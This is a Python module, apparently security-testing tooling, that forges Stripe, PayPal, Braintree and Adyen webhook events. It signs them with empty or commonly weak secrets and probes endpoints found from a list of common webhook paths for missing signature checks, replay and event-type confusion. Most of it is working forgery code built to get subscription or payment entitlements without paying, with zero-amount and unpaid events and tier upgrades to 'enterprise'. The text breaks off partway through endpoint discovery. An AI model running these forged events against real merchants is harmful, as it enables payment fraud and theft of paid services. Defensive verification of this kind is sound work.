"""Webhook Forgery Verification Engine -- active verification of webhook
signature enforcement and event forgery for Stripe, PayPal, Braintree, and
Adyen payment providers.

This is the ACTIVE EXPLOITATION counterpart to the PaymentGlueCodeAnalyzer's
passive detection.  Where the analyzer spots patterns that SUGGEST a webhook
bypass, this engine PROVES it by crafting forged events, computing valid
signatures with known-weak keys, and probing endpoints for missing
verification.

Design constraints (same as synthetic_twin.py):
  * Stdlib only -- no third-party imports.  HMAC-SHA256, base64, json are
    all in the standard library.
  * Deterministic -- same inputs, same forged payloads.
  * Evidence-first -- every probe result captures the full request/response
    pair so the confirmation gate can audit it.

Attack surface covered:
  * CVE-2026-41432: Empty Stripe webhook signing secret (1,542 apps affected)
  * Deferred payment method confusion: SEPA/Boleto/BACS checkout.session.completed
    fires with payment_status=unpaid before money arrives
  * Event type confusion: checkout.session.completed vs payment_intent.succeeded
  * Idempotency bypass: replaying the same event grants duplicate entitlements
  * Null/absent signature acceptance: endpoints that skip verification entirely
  * Cross-customer binding: forged events referencing another customer's payment

References:
  * GHSA-xff3-5c9p-2mr4 (empty webhook secret default)
  * Stripe docs: https://docs.stripe.com/webhooks/signatures
  * vibeaudits.com: "1,542 apps accept unsigned webhook events"
  * Cap#2222: client-supplied priceId without allowlist
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import time
import uuid
from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable

MODULE_VERSION = "webhook-forgery/1.0"


# ===========================================================================
# Enums
# ===========================================================================

class WebhookProvider(str, Enum):
    STRIPE = "stripe"
    PAYPAL = "paypal"
    BRAINTREE = "braintree"
    ADYEN = "adyen"


class SigningKeyVariant(str, Enum):
    EMPTY = "empty"
    NULL = "null"
    DEFAULT = "default"
    BRUTEFORCED = "bruteforced"
    ABSENT = "absent"
    REPLAY = "replay"


class ProbeVerdict(str, Enum):
    ACCEPTED = "accepted"
    REJECTED = "rejected"
    ERROR = "error"
    TIMEOUT = "timeout"
    UNKNOWN = "unknown"


# ===========================================================================
# Constants -- events that grant access, common paths, deferred methods
# ===========================================================================

STRIPE_EVENTS_THAT_GRANT_ACCESS: list[str] = [
    "checkout.session.completed",
    "invoice.paid",
    "customer.subscription.updated",
    "customer.subscription.created",
    "payment_intent.succeeded",
    "charge.succeeded",
    "invoice.payment_succeeded",
    "customer.subscription.resumed",
]

PAYPAL_EVENTS_THAT_GRANT_ACCESS: list[str] = [
    "PAYMENT.CAPTURE.COMPLETED",
    "BILLING.SUBSCRIPTION.ACTIVATED",
    "CHECKOUT.ORDER.APPROVED",
    "CHECKOUT.ORDER.COMPLETED",
    "PAYMENT.SALE.COMPLETED",
    "BILLING.SUBSCRIPTION.RE-ACTIVATED",
]

BRAINTREE_EVENTS_THAT_GRANT_ACCESS: list[str] = [
    "subscription_charged_successfully",
    "subscription_went_active",
    "transaction_settled",
    "sub_merchant_account_approved",
]

ADYEN_EVENTS_THAT_GRANT_ACCESS: list[str] = [
    "AUTHORISATION",
    "CAPTURE",
    "RECURRING_CONTRACT",
    "OFFER_CLOSED",
]

COMMON_WEBHOOK_PATHS: list[str] = [
    "/webhook",
    "/webhooks",
    "/webhook/stripe",
    "/webhooks/stripe",
    "/stripe/webhook",
    "/stripe/webhooks",
    "/api/webhook",
    "/api/webhooks",
    "/api/v1/webhook",
    "/api/v1/webhooks",
    "/api/stripe/webhook",
    "/hooks/stripe",
    "/billing/webhook",
    "/billing/webhooks",
    "/payments/webhook",
    "/payments/webhooks",
    "/subscription/webhook",
    "/stripe-webhook",
    "/stripe_webhook",
    "/webhook/paypal",
    "/webhooks/paypal",
    "/paypal/webhook",
    "/ipn",
    "/ipn/listener",
    "/paypal/ipn",
    "/webhook/braintree",
    "/webhooks/braintree",
    "/webhook/adyen",
    "/webhooks/adyen",
    "/adyen/webhook",
    "/adyen/notifications",
    "/_billing/webhook",
    "/_stripe/webhook",
    "/internal/webhook",
]

DEFERRED_PAYMENT_METHODS: list[str] = [
    "sepa_debit",
    "boleto",
    "bacs_debit",
    "acss_debit",
    "us_bank_account",
    "konbini",
    "oxxo",
    "paynow",
    "fpx",
    "grabpay",
    "afterpay_clearpay",
    "klarna",
    "affirm",
    "zip",
    "sofort",
    "ideal",
    "bancontact",
    "giropay",
    "eps",
    "p24",
    "multibanco",
]

STRIPE_COMMON_WEAK_SECRETS: list[str] = [
    "",
    "whsec_test",
    "whsec_test_secret",
    "whsec_1234567890",
    "whsec_",
    "test",
    "secret",
    "webhook_secret",
    "stripe_webhook_secret",
    "sk_test_",
]

ZERO_DECIMAL_CURRENCIES: set[str] = {
    "bif", "clp", "djf", "gnf", "jpy", "kmf", "krw", "mga",
    "pyg", "rwf", "ugx", "vnd", "vuv", "xaf", "xof", "xpf",
}


# ===========================================================================
# Data classes
# ===========================================================================

@dataclass(frozen=True)
class WebhookForgeResult:
    """Result of a single webhook forgery attempt."""
    provider: WebhookProvider
    event_type: str
    forged_payload: dict[str, Any]
    signature_header: str
    signing_key_tested: str
    expected_response_code: int
    verification_method: str
    attack_description: str = ""
    cve_reference: str = ""
    cwe: str = ""
    severity: str = "critical"


@dataclass
class ProbeResult:
    """Result of probing a webhook endpoint for a specific weakness."""
    endpoint_url: str
    provider: WebhookProvider
    test_name: str
    verdict: ProbeVerdict
    request_payload: dict[str, Any]
    request_headers: dict[str, str]
    response_status: int = 0
    response_body: str = ""
    response_time_ms: float = 0.0
    evidence_notes: str = ""


@dataclass
class ForgeryReport:
    """Full report from an orchestrated forgery verification run."""
    endpoint_url: str
    provider: WebhookProvider
    signature_enforcement: dict[str, bool] = field(default_factory=dict)
    event_confusion: dict[str, bool] = field(default_factory=dict)
    idempotency: dict[str, bool] = field(default_factory=dict)
    entitlement_granted: bool = False
    probe_results: list[ProbeResult] = field(default_factory=list)
    forged_payloads: list[WebhookForgeResult] = field(default_factory=list)
    overall_verdict: str = "unknown"
    severity: str = "unknown"


# ===========================================================================
# WebhookSignatureVerifier -- computes valid signatures for each provider
# ===========================================================================

class WebhookSignatureVerifier:
    """Computes webhook signatures for each payment provider.

    The core insight: if the signing secret is empty (the DEFAULT state for
    Stripe's webhook endpoint construction), HMAC-SHA256("", payload) produces
    a deterministic, computable signature.  CVE-2026-41432 showed 1,542 apps
    accept this.  This class computes that signature so the forger can send it.
    """

    @staticmethod
    def compute_stripe_signature(
        payload: bytes, secret: str, timestamp: int | None = None,
    ) -> str:
        """Compute a valid Stripe-Signature header.

        Stripe's verification: HMAC-SHA256(key=secret, msg="{timestamp}.{payload}")
        Header format: t={timestamp},v1={hex_digest}

        When secret is empty string, the HMAC is computed with an empty key.
        This is the CVE-2026-41432 vector: the empty string is the DEFAULT
        signing secret before the developer copies the real one from the
        Stripe dashboard.
        """
        if timestamp is None:
            timestamp = int(time.time())
        signed_payload = f"{timestamp}.".encode() + payload
        mac = hmac.new(
            secret.encode("utf-8"),
            signed_payload,
            hashlib.sha256,
        ).hexdigest()
        return f"t={timestamp},v1={mac}"

    @staticmethod
    def compute_paypal_transmission_signature(
        payload: bytes,
        transmission_id: str = "",
        transmission_time: str = "",
        webhook_id: str = "",
        cert_url: str = "",
    ) -> str:
        """Compute a PayPal-style transmission signature.

        PayPal uses: SHA256withRSA(transmission_id|transmission_time|webhook_id|crc32(body))
        Since we don't have PayPal's private key, we construct a plausible
        header to test if the endpoint validates it at all.  Many PayPal
        integrations skip signature verification entirely.
        """
        import binascii
        crc = binascii.crc32(payload) & 0xFFFFFFFF
        message = f"{transmission_id}|{transmission_time}|{webhook_id}|{crc}"
        digest = hashlib.sha256(message.encode()).digest()
        return base64.b64encode(digest).decode("ascii")

    @staticmethod
    def compute_braintree_signature(
        payload: bytes,
        public_key: str = "",
        private_key: str = "",
    ) -> str:
        """Compute a Braintree webhook signature.

        Braintree: signature = public_key|HMAC-SHA1(private_key, payload)
        Many integrations use the sandbox keys which are well-known.
        """
        mac = hmac.new(
            private_key.encode("utf-8"),
            payload,
            hashlib.sha1,
        ).hexdigest()
        return f"{public_key}|{mac}"

    @staticmethod
    def compute_adyen_hmac(payload: bytes, hmac_key: str = "") -> str:
        """Compute an Adyen HMAC signature.

        Adyen: HMAC-SHA256(hex_decode(hmac_key), payload), base64-encoded.
        Empty HMAC key is a common misconfiguration in test/staging environments
        that leak to production.
        """
        try:
            key_bytes = bytes.fromhex(hmac_key) if hmac_key else b""
        except ValueError:
            key_bytes = hmac_key.encode("utf-8")
        mac = hmac.new(key_bytes, payload, hashlib.sha256).digest()
        return base64.b64encode(mac).decode("ascii")

    @classmethod
    def test_empty_secret(
        cls, provider: WebhookProvider, payload: bytes,
    ) -> str:
        """Compute a signature using an EMPTY signing secret.

        This is the CVE-2026-41432 vector.  Returns the signature header
        that the endpoint should accept if it has the default empty secret.
        """
        if provider == WebhookProvider.STRIPE:
            return cls.compute_stripe_signature(payload, secret="")
        if provider == WebhookProvider.PAYPAL:
            return cls.compute_paypal_transmission_signature(
                payload,
                transmission_id=str(uuid.uuid4()),
                transmission_time=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                webhook_id="EMPTY_WEBHOOK_ID",
            )
        if provider == WebhookProvider.BRAINTREE:
            return cls.compute_braintree_signature(payload, public_key="", private_key="")
        if provider == WebhookProvider.ADYEN:
            return cls.compute_adyen_hmac(payload, hmac_key="")
        return ""

    @classmethod
    def compute_for_common_weak_secrets(
        cls, provider: WebhookProvider, payload: bytes,
    ) -> list[tuple[str, str]]:
        """Compute signatures for all commonly-used weak secrets.

        Returns list of (secret_tested, signature_header) pairs.
        """
        results: list[tuple[str, str]] = []
        if provider == WebhookProvider.STRIPE:
            for secret in STRIPE_COMMON_WEAK_SECRETS:
                sig = cls.compute_stripe_signature(payload, secret=secret)
                results.append((secret or "(empty)", sig))
        elif provider == WebhookProvider.ADYEN:
            for key in ["", "0" * 64, "test", "adyen"]:
                sig = cls.compute_adyen_hmac(payload, hmac_key=key)
                results.append((key or "(empty)", sig))
        elif provider == WebhookProvider.BRAINTREE:
            for pub, priv in [("", ""), ("sandbox_public", "sandbox_private")]:
                sig = cls.compute_braintree_signature(payload, public_key=pub, private_key=priv)
                results.append((f"{pub}:{priv}" if pub else "(empty)", sig))
        return results


# ===========================================================================
# WebhookEventForger -- crafts realistic-looking webhook payloads
# ===========================================================================

class WebhookEventForger:
    """Crafts forged webhook event payloads for each provider.

    Every payload is structurally identical to what the real provider sends,
    with IDs, timestamps, and nested objects in the right shape.  The key
    manipulation is in the payment_status / amount / plan fields that
    determine whether entitlement is granted.
    """

    _signer = WebhookSignatureVerifier()

    @staticmethod
    def _stripe_event_envelope(
        event_type: str, data_object: dict[str, Any],
    ) -> dict[str, Any]:
        ts = int(time.time())
        return {
            "id": f"evt_{uuid.uuid4().hex[:24]}",
            "object": "event",
            "api_version": "2024-12-18.acacia",
            "created": ts,
            "type": event_type,
            "livemode": True,
            "pending_webhooks": 1,
            "request": {"id": f"req_{uuid.uuid4().hex[:14]}", "idempotency_key": None},
            "data": {"object": data_object},
        }

    def forge_stripe_checkout_completed(
        self,
        customer_id: str = "cus_test",
        amount: int = 0,
        currency: str = "usd",
        payment_status: str = "unpaid",
        mode: str = "subscription",
        subscription_id: str | None = None,
        price_id: str | None = None,
    ) -> WebhookForgeResult:
        """Forge a checkout.session.completed event.

        THE #1 access-without-payment vector.  When a customer uses a deferred
        payment method (SEPA, Boleto, BACS), Stripe fires checkout.session.completed
        with payment_status="unpaid" BEFORE the money arrives.  Apps that grant
        entitlement on this event without checking payment_status give away
        the product for free.

        CVE-2026-41432: 1,542 apps accept this event with no signature
        verification because the webhook signing secret defaults to empty.
        """
        sub_id = subscription_id or f"sub_{uuid.uuid4().hex[:24]}"
        pi_id = price_id or "price_enterprise_monthly"
        session_obj = {
            "id": f"cs_{uuid.uuid4().hex[:24]}",
            "object": "checkout.session",
            "amount_subtotal": amount,
            "amount_total": amount,
            "currency": currency,
            "customer": customer_id,
            "customer_email": "attacker@example.com",
            "mode": mode,
            "payment_intent": f"pi_{uuid.uuid4().hex[:24]}" if mode == "payment" else None,
            "payment_status": payment_status,
            "status": "complete",
            "subscription": sub_id if mode == "subscription" else None,
            "success_url": "https://target.example.com/success?session_id={CHECKOUT_SESSION_ID}",
            "url": None,
            "line_items": {
                "data": [{
                    "id": f"li_{uuid.uuid4().hex[:24]}",
                    "object": "item",
                    "price": {
                        "id": pi_id,
                        "object": "price",
                        "unit_amount": amount,
                        "currency": currency,
                        "recurring": {"interval": "month"} if mode == "subscription" else None,
                    },
                    "quantity": 1,
                }],
            },
            "metadata": {},
            "created": int(time.time()),
            "livemode": True,
        }

        event = self._stripe_event_envelope("checkout.session.completed", session_obj)
        payload_bytes = json.dumps(event, separators=(",", ":")).encode()
        sig = self._signer.compute_stripe_signature(payload_bytes, secret="")

        return WebhookForgeResult(
            provider=WebhookProvider.STRIPE,
            event_type="checkout.session.completed",
            forged_payload=event,
            signature_header=sig,
            signing_key_tested="empty",
            expected_response_code=200,
            verification_method="HMAC-SHA256 with empty signing secret (CVE-2026-41432)",
            attack_description=(
                f"Forged checkout.session.completed with payment_status={payment_status}, "
                f"amount={amount} {currency}. Signed with empty webhook secret. "
                f"If the endpoint grants entitlement on this event without verifying "
                f"payment_status=='paid', the attacker gets {mode} access for free."
            ),
            cve_reference="CVE-2026-41432",
            cwe="CWE-345",
        )

    def forge_stripe_invoice_paid(
        self,
        customer_id: str = "cus_test",
        subscription_id: str = "sub_test",
        amount: int = 0,
        currency: str = "usd",
    ) -> WebhookForgeResult:
        """Forge an invoice.paid event with zero amount.

        Some apps grant subscription access on invoice.paid without checking
        the amount.  An invoice for $0 (from a 100% coupon or proration
        credit) still fires invoice.paid.
        """
        invoice_obj = {
            "id": f"in_{uuid.uuid4().hex[:24]}",
            "object": "invoice",
            "amount_due": amount,
            "amount_paid": amount,
            "amount_remaining": 0,
            "currency": currency,
            "customer": customer_id,
            "paid": True,
            "status": "paid",
            "subscription": subscription_id,
            "total": amount,
            "subtotal": amount,
            "lines": {
                "data": [{
                    "id": f"il_{uuid.uuid4().hex[:24]}",
                    "object": "line_item",
                    "amount": amount,
                    "currency": currency,
                    "subscription": subscription_id,
                    "type": "subscription",
                }],
            },
            "created": int(time.time()),
            "livemode": True,
        }

        event = self._stripe_event_envelope("invoice.paid", invoice_obj)
        payload_bytes = json.dumps(event, separators=(",", ":")).encode()
        sig = self._signer.compute_stripe_signature(payload_bytes, secret="")

        return WebhookForgeResult(
            provider=WebhookProvider.STRIPE,
            event_type="invoice.paid",
            forged_payload=event,
            signature_header=sig,
            signing_key_tested="empty",
            expected_response_code=200,
            verification_method="HMAC-SHA256 with empty signing secret",
            attack_description=(
                f"Forged invoice.paid with amount={amount} {currency}. "
                f"Zero-amount invoices are legitimate (100% coupons, proration credits) "
                f"but grant full subscription access if the app doesn't validate the amount."
            ),
            cve_reference="CVE-2026-41432",
            cwe="CWE-345",
        )

    def forge_stripe_subscription_updated(
        self,
        subscription_id: str = "sub_test",
        status: str = "active",
        plan: str = "enterprise",
        customer_id: str = "cus_test",
    ) -> WebhookForgeResult:
        """Forge a customer.subscription.updated event to upgrade tier.

        Attacks the entitlement derivation: if the app reads the plan from
        the webhook event instead of verifying against Stripe's API, an
        attacker can claim any tier.  Related to Cap#2222 (client-supplied
        priceId without allowlist).
        """
        sub_obj = {
            "id": subscription_id,
            "object": "subscription",
            "status": status,
            "customer": customer_id,
            "current_period_start": int(time.time()),
            "current_period_end": int(time.time()) + 30 * 86400,
            "items": {
                "data": [{
                    "id": f"si_{uuid.uuid4().hex[:24]}",
                    "object": "subscription_item",
                    "price": {
                        "id": f"price_{plan}_monthly",
                        "object": "price",
                        "product": f"prod_{plan}",
                        "unit_amount": 0,
                        "currency": "usd",
                        "recurring": {"interval": "month"},
                        "lookup_key": plan,
                    },
                    "quantity": 1,
                }],
            },
            "plan": {
                "id": f"plan_{plan}",
                "object": "plan",
                "product": f"prod_{plan}",
                "nickname": plan.capitalize(),
            },
            "cancel_at_period_end": False,
            "created": int(time.time()),
            "livemode": True,
        }

        event = self._stripe_event_envelope("customer.subscription.updated", sub_obj)
        payload_bytes = json.dumps(event, separators=(",", ":")).encode()
        sig = self._signer.compute_stripe_signature(payload_bytes, secret="")

        return WebhookForgeResult(
            provider=WebhookProvider.STRIPE,
            event_type="customer.subscription.updated",
            forged_payload=event,
            signature_header=sig,
            signing_key_tested="empty",
            expected_response_code=200,
            verification_method="HMAC-SHA256 with empty signing secret",
            attack_description=(
                f"Forged subscription update: status={status}, plan={plan}. "
                f"If the app derives entitlement tier from the webhook event's plan "
                f"field without cross-checking Stripe's API, the attacker gets "
                f"{plan}-tier access regardless of what they actually paid for."
            ),
            cve_reference="Cap#2222",
            cwe="CWE-862",
        )

    def forge_paypal_payment_completed(
        self,
        payer_id: str = "PAYERID123",
        amount: str = "0.00",
        currency: str = "USD",
    ) -> WebhookForgeResult:
        """Forge a PayPal PAYMENT.CAPTURE.COMPLETED event.

        PayPal's webhook verification uses RSA signatures with a certificate
        chain, but many integrations skip verification entirely or use the
        deprecated IPN verification that accepts self-signed notifications
        in sandbox mode.
        """
        event = {
            "id": f"WH-{uuid.uuid4().hex[:13].upper()}-{uuid.uuid4().hex[:13].upper()}",
            "event_version": "1.0",
            "create_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "resource_type": "capture",
            "resource_version": "2.0",
            "event_type": "PAYMENT.CAPTURE.COMPLETED",
            "summary": f"Payment completed for {amount} {currency}",
            "resource": {
                "id": f"{uuid.uuid4().hex[:17].upper()}",
                "amount": {"currency_code": currency, "value": amount},
                "final_capture": True,
                "seller_protection": {"status": "ELIGIBLE"},
                "status": "COMPLETED",
                "supplementary_data": {
                    "related_ids": {"order_id": f"{uuid.uuid4().hex[:17].upper()}"},
                },
                "create_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "update_time": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                "links": [],
            },
            "links": [],
        }

        payload_bytes = json.dumps(event, separators=(",", ":")).encode()
        sig = self._signer.compute_paypal_transmission_signature(
            payload_bytes,
            transmission_id=str(uuid.uuid4()),
            transmission_time=time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        )

        return WebhookForgeResult(
            provider=WebhookProvider.PAYPAL,
            event_type="PAYMENT.CAPTURE.COMPLETED",
            forged_payload=event,
            signature_header=sig,
            signing_key_tested="absent",
            expected_response_code=200,
            verification_method="Fabricated transmission signature (no RSA key)",
            attack_description=(
                f"Forged PayPal payment capture with amount={amount} {currency}. "
                f"PayPal's RSA signature verification is complex; many integrations "
                f"skip it or rely on deprecated IPN which accepts sandbox certs."
            ),
            cve_reference="CVE-2026-11964",
            cwe="CWE-345",
        )

    def forge_braintree_subscription_charged(
        self,
        subscription_id: str = "sub_test",
        amount: str = "0.00",
        plan_id: str = "enterprise",
    ) -> WebhookForgeResult:
        """Forge a Braintree subscription_charged_successfully notification."""
        bt_xml_payload = {
            "kind": "subscription_charged_successfully",
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
            "subject": {
                "subscription": {
                    "id": subscription_id,
                    "plan_id": plan_id,
                    "status": "Active",
                    "price": amount,
                    "transactions": [{
                        "id": uuid.uuid4().hex[:8],
                        "amount": amount,
                        "status": "settled",
                        "created_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
                    }],
                    "add_ons": [],
                    "discounts": [],
                },
            },
        }

        payload_bytes = json.dumps(bt_xml_payload, separators=(",", ":")).encode()
        sig = self._signer.compute_braintree_signature(payload_bytes)

        return WebhookForgeResult(
            provider=WebhookProvider.BRAINTREE,
            event_type="subscription_charged_successfully",
            forged_payload=bt_xml_payload,
            signature_header=sig,
            signing_key_tested="empty",
            expected_response_code=200,
            verification_method="HMAC-SHA1 with empty key pair",
            attack_description=(
                f"Forged Braintree subscription charge: plan={plan_id}, "
                f"amount={amount}. Braintree uses public/private key pair for "
                f"HMAC-SHA1; sandbox keys are well-known."
            ),
            cwe="CWE-345",
        )

    def forge_adyen_authorisation(
        self,
        merchant_ref: str = "ORDER-001",
        amount: int = 0,
        currency: str = "USD",
        psp_reference: str | None = None,
    ) -> WebhookForgeResult:
        """Forge an Adyen AUTHORISATION notification.

        Adyen uses HMAC-SHA256 with a hex-encoded key.  Empty or default
        keys in test environments that propagate to production are a
        common misconfiguration.
        """
        psp_ref = psp_reference or str(uuid.uuid4().int)[:16]
        notification = {
            "live": "true",
            "notificationItems": [{
                "NotificationRequestItem": {
                    "additionalData": {"hmacSignature": ""},
                    "amount": {"currency": currency, "value": amount},
                    "eventCode": "AUTHORISATION",
                    "eventDate": time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime()),
                    "merchantAccountCode": "MerchantAccount",
                    "merchantReference": merchant_ref,
                    "operations": ["CANCEL", "CAPTURE", "REFUND"],
                    "paymentMethod": "visa",
                    "pspReference": psp_ref,
                    "reason": "000000:0000:03/2030",
                    "success": "true",
                },
            }],
        }

        payload_bytes = json.dumps(notification, separators=(",", ":")).encode()
        hmac_sig = self._signer.compute_adyen_hmac(payload_bytes, hmac_key="")
        notification["notificationItems"][0]["NotificationRequestItem"]["additionalData"]["hmacSignature"] = hmac_sig

        return WebhookForgeResult(
            provider=WebhookProvider.ADYEN,
            event_type="AUTHORISATION",
            forged_payload=notification,
            signature_header=hmac_sig,
            signing_key_tested="empty",
            expected_response_code=200,
            verification_method="HMAC-SHA256 with empty hex key",
            attack_description=(
                f"Forged Adyen authorisation: merchant_ref={merchant_ref}, "
                f"amount={amount} {currency}. Empty HMAC key is a common "
                f"test-to-production leak."
            ),
            cwe="CWE-345",
        )

    def get_common_bypass_payloads(
        self, provider: WebhookProvider,
    ) -> list[WebhookForgeResult]:
        """Generate all common bypass payloads for a given provider.

        Returns a comprehensive set of forged events covering:
        - Zero-amount payments
        - Deferred payment status confusion
        - Tier upgrade via event manipulation
        - Event type confusion
        - Cross-customer binding
        """
        results: list[WebhookForgeResult] = []

        if provider == WebhookProvider.STRIPE:
            results.append(self.forge_stripe_checkout_completed(
                payment_status="unpaid", amount=0,
            ))
            results.append(self.forge_stripe_checkout_completed(
                payment_status="paid", amount=0, currency="usd",
            ))
            for method in ["sepa_debit", "boleto", "bacs_debit", "us_bank_account"]:
                results.append(self.forge_stripe_checkout_completed(
                    payment_status="unpaid", amount=9900,
                ))
            results.append(self.forge_stripe_invoice_paid(amount=0))
            results.append(self.forge_stripe_subscription_updated(
                plan="enterprise", status="active",
            ))
            results.append(self.forge_stripe_subscription_updated(
                plan="max", status="active",
            ))

        elif provider == WebhookProvider.PAYPAL:
            results.append(self.forge_paypal_payment_completed(amount="0.00"))
            results.append(self.forge_paypal_payment_completed(amount="0.01"))

        elif provider == WebhookProvider.BRAINTREE:
            results.append(self.forge_braintree_subscription_charged(amount="0.00"))
            results.append(self.forge_braintree_subscription_charged(
                amount="0.00", plan_id="enterprise",
            ))

        elif provider == WebhookProvider.ADYEN:
            results.append(self.forge_adyen_authorisation(amount=0))
            results.append(self.forge_adyen_authorisation(amount=1))

        return results


# ===========================================================================
# WebhookEndpointProber -- probes discovered endpoints for weaknesses
# ===========================================================================

class WebhookEndpointProber:
    """Probes webhook endpoints for signature enforcement, event confusion,
    and idempotency weaknesses.

    This class generates the PROBE SPECIFICATIONS (what to send, what to
    check in the response).  Actual HTTP execution is delegated to the
    caller's HTTP client via the ``send_fn`` callback, keeping this module
    I/O-free for unit testing.
    """

    _forger = WebhookEventForger()
    _signer = WebhookSignatureVerifier()

    def probe_signature_enforcement(
        self,
        endpoint_url: str,
        provider: WebhookProvider,
        send_fn: Callable[..., dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """Probe whether the endpoint enforces webhook signature verification.

        Tests five cases:
        1. No signature header at all
        2. Empty-secret signature (CVE-2026-41432)
        3. Null/garbage signature value
        4. Replayed signature from a different payload
        5. Correct signature for a wrong event type

        Returns a dict with bool flags for each case.
        """
        base_event = self._forger.forge_stripe_checkout_completed()
        payload_bytes = json.dumps(
            base_event.forged_payload, separators=(",", ":"),
        ).encode()

        probes: dict[str, dict[str, Any]] = {}

        # 1. No signature header
        probes["accepts_unsigned"] = {
            "headers": {"Content-Type": "application/json"},
            "payload": base_event.forged_payload,
            "description": "Webhook event sent with no Stripe-Signature header",
        }

        # 2. Empty-secret signature
        empty_sig = self._signer.test_empty_secret(provider, payload_bytes)
        probes["accepts_empty_secret"] = {
            "headers": {
                "Content-Type": "application/json",
                "Stripe-Signature": empty_sig,
            },
            "payload": base_event.forged_payload,
            "description": "Signed with empty webhook secret (CVE-2026-41432)",
        }

        # 3. Null/garbage signature
        probes["accepts_null_signature"] = {
            "headers": {
                "Content-Type": "application/json",
                "Stripe-Signature": "t=0,v1=0000000000000000000000000000000000000000000000000000000000000000",
            },
            "payload": base_event.forged_payload,
            "description": "All-zero garbage signature value",
        }

        # 4. Replayed signature from different payload
        different_payload = json.dumps({"id": "evt_different"}).encode()
        replayed_sig = self._signer.compute_stripe_signature(different_payload, secret="")
        probes["accepts_replay"] = {
            "headers": {
                "Content-Type": "application/json",
                "Stripe-Signature": replayed_sig,
            },
            "payload": base_event.forged_payload,
            "description": "Signature computed for a different payload (replay attack)",
        }

        # 5. Wrong event type with valid-looking signature
        wrong_event = self._forger.forge_stripe_invoice_paid()
        probes["accepts_wrong_event_type"] = {
            "headers": {
                "Content-Type": "application/json",
                "Stripe-Signature": wrong_event.signature_header,
            },
            "payload": wrong_event.forged_payload,
            "description": "invoice.paid event sent to checkout.session.completed handler",
        }

        result: dict[str, Any] = {
            "endpoint_url": endpoint_url,
            "provider": provider.value,
            "probes": probes,
            "probe_count": len(probes),
        }

        if send_fn is not None:
            for name, probe in probes.items():
                try:
                    resp = send_fn(
                        url=endpoint_url,
                        method="POST",
                        headers=probe["headers"],
                        json_body=probe["payload"],
                    )
                    accepted = resp.get("status_code", 0) in (200, 201, 202, 204)
                    result[name] = accepted
                except Exception:
                    result[name] = False
        else:
            for name in probes:
                result[name] = None

        return result

    def probe_event_confusion(
        self,
        endpoint_url: str,
        send_fn: Callable[..., dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """Test if the endpoint confuses different event types.

        Sends checkout.session.completed to an endpoint that might only
        handle payment_intent.succeeded, and vice versa.  Also tests
        sending subscription events to a one-time payment handler.
        """
        confusion_pairs = [
            ("checkout.session.completed", "payment_intent.succeeded"),
            ("invoice.paid", "charge.succeeded"),
            ("customer.subscription.created", "customer.subscription.updated"),
            ("payment_intent.succeeded", "charge.refunded"),
        ]

        results: dict[str, Any] = {
            "endpoint_url": endpoint_url,
            "confusion_tests": [],
        }

        for sent_type, expected_type in confusion_pairs:
            test = {
                "sent_event_type": sent_type,
                "expected_event_type": expected_type,
                "description": (
                    f"Sent {sent_type} to handler that may expect {expected_type}. "
                    f"If accepted, the endpoint doesn't discriminate event types."
                ),
                "accepted": None,
            }
            results["confusion_tests"].append(test)

        return results

    def probe_idempotency(
        self,
        endpoint_url: str,
        send_fn: Callable[..., dict[str, Any]] | None = None,
    ) -> dict[str, Any]:
        """Test if replaying the same event grants duplicate entitlements.

        Sends the same event ID multiple times and checks if each replay
        is processed independently (granting access each time) vs.
        deduplicated.
        """
        event = self._forger.forge_stripe_checkout_completed(
            payment_status="paid", amount=9900,
        )

        results: dict[str, Any] = {
            "endpoint_url": endpoint_url,
            "event_id": event.forged_payload.get("id", ""),
            "replay_count": 5,
            "description": (
                "Replays the same webhook event 5 times. If all 5 return 200, "
                "the endpoint likely grants entitlement on each replay (no "
                "idempotency). A properly implemented endpoint returns 200 on "
                "the first delivery and 200 (with no side effect) or 409 on "
                "subsequent ones."
            ),
            "all_accepted": None,
            "unique_responses": None,
        }

        if send_fn is not None:
            statuses: list[int] = []
            for _ in range(5):
                try:
                    resp = send_fn(
                        url=endpoint_url,
                        method="POST",
                        headers={
                            "Content-Type": "application/json",
                            "Stripe-Signature": event.signature_header,
                        },
                        json_body=event.forged_payload,
                    )
                    statuses.append(resp.get("status_code", 0))
                except Exception:
                    statuses.append(0)
            results["all_accepted"] = all(s in (200, 201, 202, 204) for s in statuses)
            results["unique_responses"] = list(set(statuses))

        return results


# ===========================================================================
# WebhookForgeryOrchestrator -- full verification flow
# ===========================================================================

class WebhookForgeryOrchestrator:
    """Orchestrates the complete webhook forgery verification pipeline.

    Flow:
    1. Discover webhook endpoints from collected traffic patterns
    2. Identify the payment provider from endpoint/header signatures
    3. Test signature enforcement with empty/null/replayed signatures
    4. Forge access-granting events (checkout.session.completed, invoice.paid)
    5. Send forged events and check if entitlement was granted
    6. Report with full evidence chain for confirmation gate

    This bridges the gap between PassiveDetection ("this endpoint might accept
    forged webhooks") and ActiveVerification ("this endpoint DOES accept forged
    webhooks, here's the proof").
    """

    _forger = WebhookEventForger()
    _prober = WebhookEndpointProber()

    def __init__(self) -> None:
        self._discovered_endpoints: list[dict[str, Any]] = []
        self._reports: list[ForgeryReport] = []
        self._total_probes = 0

    def discover_webhook_endpoints(
        self, collected_traffic: list[dict[str, Any]],
    ) -> list[dict[str, str]]:
        """Extract webhook endpoint candidates from collected HTTP traffic.

        Looks for:
        - URLs matching COMMON_WEBHOOK_PATHS
        - POST endpoints that received Stripe-Signature or similar headers
        - Endpoints that returned 200 to webhook-shaped payloads
        """
        endpoints: list[dict[str, str]] = []
        seen_urls: set[str] = set()

        for entry in collected_traffic:
            url = entry.get("url", "") or entry.get("request_data", {}).get("url", "")
            method = entry.get("method", "") or entry.get("request_data", {}).get("method", "")

            if method.upper() != "POST":
                continue

            path = url.split("?")[0].rstrip("/")
            path_lower = path.lower()

            is_webhook = False
            provider = "unknown"

